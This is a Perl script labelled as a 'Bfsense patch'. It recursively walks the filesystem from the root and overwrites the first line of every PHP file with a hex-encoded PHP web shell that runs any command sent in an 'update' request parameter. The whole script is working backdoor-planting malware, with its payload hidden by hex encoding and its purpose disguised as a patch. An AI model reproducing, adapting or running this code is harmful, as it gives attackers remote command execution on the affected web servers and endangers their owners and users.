################################# ## Bfsense patch ## #################################
############################# # Github.com/M507/Bfsense # #############################
use strict;
use warnings;

my $path = "/";
find($path);

sub find {
    my ($s) = @_;
    foreach my $files ( glob "$s/*" ) {
        if ( -f $files ) {
            if ( $files =~ /\.php$/i ) {
                print "$files \n";

                my $file = $files;
                my $newline = pack("H*", "3c3f70687020696628697373657428245f524551554553545b27757064617465275d29297b202475203d2028245f524551554553545b27757064617465275d293b2073797374656d282475293b207d3f3e3c3f706870");
                {
                    local @ARGV = ($file);
                    local $^I   = '.bac';
                    while (<>) {
                        if ( $. == 1 ) {
                            print "$newline$/";
                        }
                        else {
                            print;
                        }
                    }
                }
            }
        }
        elsif ( -d $files ) {
            find("$files");
        }
    }
}
